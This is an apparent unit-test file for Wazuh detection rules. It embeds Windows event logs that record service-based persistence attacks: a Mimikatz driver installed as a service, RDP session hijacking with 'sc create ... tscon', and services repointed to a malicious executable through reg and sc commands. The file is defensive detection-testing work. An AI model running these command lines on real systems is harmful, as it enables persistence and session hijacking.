import unittest

from internal.logtest import LogtestStatus, send_multiple_logs  # type: ignore


class TestTa0003PersistenceT1543003CreateOrModifySystemProcessWindowsService(unittest.TestCase):

    def test_id13_new_service_for_mimikatz(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "eventID": "13", "version": "2", "level": "4", "task": "13", "opcode": "0", "keywords": "0x8000000000000000", "systemTime": "2021-03-26T16:12:22.2011089Z", "eventRecordID": "1271703", "processID": "2356", "threadID": "4276", "channel": "Microsoft-Windows-Sysmon/Operational", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "Registry value set:\nRuleName: -\nEventType: SetValue\nUtcTime: 2021-03-26 16:12:22.200\nProcessGuid: {5d63072b-6d18-6050-0a00-000000003300}\nProcessId: 684\nImage: C:\\Windows\\system32\\services.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\mimidrv\\Start\nDetails: DWORD (0x00000002)\nUser: %9"}, "eventdata": {"eventType": "SetValue", "utcTime": "2021-03-26 16:12:22.200", "processGuid": "{5d63072b-6d18-6050-0a00-000000003300}", "processId": "684", "image": "C:\\Windows\\system32\\services.exe", "targetObject": "HKLM\\System\\CurrentControlSet\\Services\\mimidrv\\Start", "details": "DWORD (0x00000002)"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "eventID": "13", "version": "2", "level": "4", "task": "13", "opcode": "0", "keywords": "0x8000000000000000", "systemTime": "2021-03-26T16:12:22.2016728Z", "eventRecordID": "1271704", "processID": "2356", "threadID": "4276", "channel": "Microsoft-Windows-Sysmon/Operational", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "Registry value set:\nRuleName: -\nEventType: SetValue\nUtcTime: 2021-03-26 16:12:22.200\nProcessGuid: {5d63072b-6d18-6050-0a00-000000003300}\nProcessId: 684\nImage: C:\\Windows\\system32\\services.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\mimidrv\\ImagePath\nDetails: \\??\\C:\\TOOLS\\Security_tool\\Mimikatz-fev-2020\\mimidrv.sys\nUser: %9"}, "eventdata": {"eventType": "SetValue", "utcTime": "2021-03-26 16:12:22.200", "processGuid": "{5d63072b-6d18-6050-0a00-000000003300}", "processId": "684", "image": "C:\\Windows\\system32\\services.exe", "targetObject": "HKLM\\System\\CurrentControlSet\\Services\\mimidrv\\ImagePath", "details": "\\??\\C:\\TOOLS\\Security_tool\\Mimikatz-fev-2020\\mimidrv.sys"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4688_4697_rdp_hijack_via_service_creation(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Eventlog", "providerGuid": "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", "eventID": "1102", "version": "0", "level": "4", "task": "104", "opcode": "0", "keywords": "0x4020000000000000", "systemTime": "2021-05-14T20:39:33.2145439Z", "eventRecordID": "1829531", "processID": "948", "threadID": "3768", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "INFORMATION", "message": "The audit log was cleared.\nSubject:\n\tSecurity ID:\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\tadmmig\n\tDomain Name:\tOFFSEC\n\tLogon ID:\t0x13B593D"}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-05-14T20:39:35.3825021Z", "eventRecordID": "1829532", "processID": "4", "threadID": "4288", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x13B593D\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0xbd8\n\tNew Process Name:\tC:\\Windows\\System32\\sc.exe\n\tToken Elevation Type:\t%%1937\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0xbc0\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\tsc.exe  create hijackservice binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#5\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x13b593d", "newProcessId": "0xbd8", "newProcessName": "C:\\Windows\\System32\\sc.exe", "tokenElevationType": "%%1937", "processId": "0xbc0", "commandLine": "sc.exe  create hijackservice binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#5\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4697", "version": "0", "level": "0", "task": "12289", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-05-14T20:39:35.4065270Z", "eventRecordID": "1829533", "processID": "576", "threadID": "4904", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A service was installed in the system.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x13B593D\n\nService Information:\n\tService Name: \t\thijackservice\n\tService File Name:\tcmd.exe /k tscon 2 /dest:rdp-tcp#5\n\tService Type: \t\t0x10\n\tService Start Type:\t3\n\tService Account: \t\tLocalSystem"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x13b593d", "serviceName": "hijackservice", "serviceFileName": "cmd.exe /k tscon 2 /dest:rdp-tcp#5", "serviceType": "0x10", "serviceStartType": "3", "serviceAccount": "LocalSystem"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4688_command_sc_to_create_service_on_remote_host(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2020-07-11T21:46:39.7863189Z", "eventRecordID": "2774806", "processID": "4", "threadID": "9496", "channel": "Security", "computer": "jump01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x58DBAA\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x53c\n\tNew Process Name:\tC:\\Windows\\System32\\sc.exe\n\tToken Elevation Type:\t%%1938\n\tMandatory Label:\t\tS-1-16-8192\n\tCreator Process ID:\t0x1bb4\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\tsc  \\\\fs02\\ create hacker-testl binPath=\"virus.exe\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x58dbaa", "newProcessId": "0x53c", "newProcessName": "C:\\Windows\\System32\\sc.exe", "tokenElevationType": "%%1938", "processId": "0x1bb4", "commandLine": "sc  \\\\fs02\\ create hacker-testl binPath=\"virus.exe\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-8192"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4688_service_abuse_with_failure_command(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-07T14:52:54.8486184Z", "eventRecordID": "2898999", "processID": "4", "threadID": "10972", "channel": "Security", "computer": "win10-02.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5F72FEE\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x2a58\n\tNew Process Name:\tC:\\Windows\\System32\\reg.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x2924\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\tREG  ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\" /v FailureCommand /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x5f72fee", "newProcessId": "0x2a58", "newProcessName": "C:\\Windows\\System32\\reg.exe", "tokenElevationType": "%%1936", "processId": "0x2924", "commandLine": "REG  ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\" /v FailureCommand /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-07T14:53:02.1470689Z", "eventRecordID": "2899000", "processID": "4", "threadID": "8640", "channel": "Security", "computer": "win10-02.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5F72FEE\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0xa00\n\tNew Process Name:\tC:\\Windows\\System32\\sc.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x2924\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\tsc  failure W32Time command= \"\\\"c:\\Windows\\system32\\pentestlab.exe\\\"\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x5f72fee", "newProcessId": "0xa00", "newProcessName": "C:\\Windows\\System32\\sc.exe", "tokenElevationType": "%%1936", "processId": "0x2924", "commandLine": "sc  failure W32Time command= \"\\\"c:\\Windows\\system32\\pentestlab.exe\\\"\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4688_service_abuse_with_malicious_path(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-07T15:36:23.4296658Z", "eventRecordID": "2899877", "processID": "4", "threadID": "8640", "channel": "Security", "computer": "win10-02.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5F72FEE\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x29cc\n\tNew Process Name:\tC:\\Windows\\System32\\sc.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x2924\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\tsc  config xboxgip binPath= \"C:\\windows\\system32\\pentestlab.exe\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x5f72fee", "newProcessId": "0x29cc", "newProcessName": "C:\\Windows\\System32\\sc.exe", "tokenElevationType": "%%1936", "processId": "0x2924", "commandLine": "sc  config xboxgip binPath= \"C:\\windows\\system32\\pentestlab.exe\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-07T15:36:24.8920246Z", "eventRecordID": "2899878", "processID": "4", "threadID": "8640", "channel": "Security", "computer": "win10-02.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5F72FEE\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x11b8\n\tNew Process Name:\tC:\\Windows\\System32\\reg.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x2924\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\treg  add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\xboxgip\" /v ImagePath /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x5f72fee", "newProcessId": "0x11b8", "newProcessName": "C:\\Windows\\System32\\reg.exe", "tokenElevationType": "%%1936", "processId": "0x2924", "commandLine": "reg  add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\xboxgip\" /v ImagePath /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-07T15:36:29.5087608Z", "eventRecordID": "2899879", "processID": "4", "threadID": "10972", "channel": "Security", "computer": "win10-02.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWIN10-02$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5F72FEE\n\nProcess Information:\n\tNew Process ID:\t\t0x2990\n\tNew Process Name:\tC:\\Users\\admmig\\AppData\\Local\\Microsoft\\OneDrive\\21.180.0905.0007\\FileCoAuth.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x318\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\n\tProcess Command Line:\t\"C:\\Users\\admmig\\AppData\\Local\\Microsoft\\OneDrive\\21.180.0905.0007\\FileCoAuth.exe\" -Embedding\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "WIN10-02$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "newProcessId": "0x2990", "newProcessName": "C:\\Users\\admmig\\AppData\\Local\\Microsoft\\OneDrive\\21.180.0905.0007\\FileCoAuth.exe", "tokenElevationType": "%%1936", "processId": "0x318", "commandLine": "\"C:\\Users\\admmig\\AppData\\Local\\Microsoft\\OneDrive\\21.180.0905.0007\\FileCoAuth.exe\" -Embedding", "targetUserSid": "S-1-0-0", "targetUserName": "admmig", "targetDomainName": "OFFSEC", "targetLogonId": "0x5f72fee", "parentProcessName": "C:\\Windows\\System32\\svchost.exe", "mandatoryLabel": "S-1-16-12288"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id4688_service_created_command(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-25T20:17:07.5650112Z", "eventRecordID": "111392", "processID": "4", "threadID": "3948", "channel": "Security", "computer": "FS03.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x123550\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x64c\n\tNew Process Name:\tC:\\Windows\\System32\\sc.exe\n\tToken Elevation Type:\t%%1937\n\tMandatory Label:\t\t%15\n\tCreator Process ID:\t%8\n\tCreator Process Name:\t%14!S!\n\tProcess Command Line:\t%9!S!\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x123550", "newProcessId": "0x64c", "newProcessName": "C:\\Windows\\System32\\sc.exe", "tokenElevationType": "%%1937", "processId": "0x408", "commandLine": "sc  create hacker-testl3 binPath=\"3virus.exe\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-25T20:17:14.5963609Z", "eventRecordID": "111401", "processID": "4", "threadID": "3216", "channel": "Security", "computer": "FS03.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS03$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0xaf0\n\tNew Process Name:\tC:\\Windows\\System32\\taskhostex.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\t%15\n\tCreator Process ID:\t%8\n\tCreator Process Name:\t%14!S!\n\tProcess Command Line:\t%9!S!\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does 